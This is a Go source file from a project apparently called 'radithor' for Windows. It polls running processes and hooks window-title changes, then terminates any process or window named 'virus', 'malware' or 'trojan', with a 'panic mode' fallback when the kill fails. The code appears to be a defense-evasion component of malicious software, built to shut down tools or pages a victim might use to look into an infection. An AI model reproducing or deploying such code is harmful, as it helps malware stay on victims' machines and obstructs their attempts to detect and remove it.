package lockdown

import (
	"fmt"
	"runtime"
	"slices"
	"syscall"
	"time"

	"radithor/core"
	"radithor/store"
	"radithor/utils"

	"github.com/horobimasu/windowsx"
	"golang.org/x/sys/windows"
)

var TitlesToBlock = []string{
	"virus",
	"malware",
	"trojan",
}

var stopProcessDetection chan struct{}

var (
	titleThreadId uint32

	titleCallback = syscall.NewCallback(onTitleChange)
)

func EnableProcessDetection() { // yea yea ik very ugly
	stopProcessDetection = make(chan struct{})

	go func() {
		for {
			select {
			case <-stopProcessDetection:
				return

			default:
				procs, err := utils.GetAllRunningProcs()
				if err != nil {
					continue
				}

				for _, proc := range procs {
					if slices.Contains(TitlesToBlock, proc.Name) {
						err = utils.TerminateProc(proc.Pid)
						if err != nil {
							panicModeCallback()
						} else {
							if store.DEBUG_MODE_ENABLED {
								windows.MessageBox(
									windows.HWND(uintptr(0)),
									windows.StringToUTF16Ptr(fmt.Sprintf("panic mode killed process with pid %d because title was %q", proc.Pid, proc.Name)),
									windows.StringToUTF16Ptr("radithor debug mode"),
									windows.MB_OK|windows.MB_ICONINFORMATION,
								)
							}
						}
					}
				}
			}

			time.Sleep(3 * time.Second)
		}
	}()
}

func DisableProcessDetection() {
	close(stopProcessDetection)
}

func EnableTitleDetection() {
	go func() {
		runtime.LockOSThread()

		var msg windowsx.Msg
		windowsx.PeekMessage(&msg, 0, _WM_USER, _WM_USER, windowsx.PM_NOREMOVE)

		titleThreadId = windows.GetCurrentThreadId()

		hook, err := windowsx.SetEventHook(
			windowsx.EVENT_OBJECT_NAMECHANGE,
			windowsx.EVENT_OBJECT_NAMECHANGE,
			0,
			titleCallback,
			0,
			0,
			windowsx.WINEVENT_OUTOFCONTEXT,
		)

		if err != nil {
			core.LogError("[EnableTitleDetection] failed to set hook")
			return
		}

		for {
			ret, _ := windowsx.GetMessage(&msg, 0, 0, 0)
			if ret <= 0 {
				break
			}
		}

		windowsx.UnhookEvent(hook)
	}()
}

func DisableTitleDetection() {
	windowsx.PostThreadMessage(titleThreadId, _WM_QUIT, 0, 0)
}

func onTitleChange(
	hook uintptr,
	event uintptr,
	handle uintptr,
	object uintptr,
	child uintptr,
	thread uintptr,
	time uintptr,
) uintptr {
	if int32(object) != 0 {
		return 0
	}

	title, err := windowsx.GetWindowText(handle)
	if err != nil || !slices.Contains(TitlesToBlock, title) {
		return 0
	}

	var pid uint32
	windows.GetWindowThreadProcessId(windows.HWND(handle), &pid)

	err = utils.TerminateProc(pid)
	if err != nil {
		panicModeCallback()
	} else {
		if store.DEBUG_MODE_ENABLED {
			windows.MessageBox(
				windows.HWND(uintptr(0)),
				windows.StringToUTF16Ptr(fmt.Sprintf("panic mode killed process with pid %d because title was %q", pid, title)),
				windows.StringToUTF16Ptr("radithor debug mode"),
				windows.MB_OK|windows.MB_ICONINFORMATION,
			)
		}
	}

	return 0
}
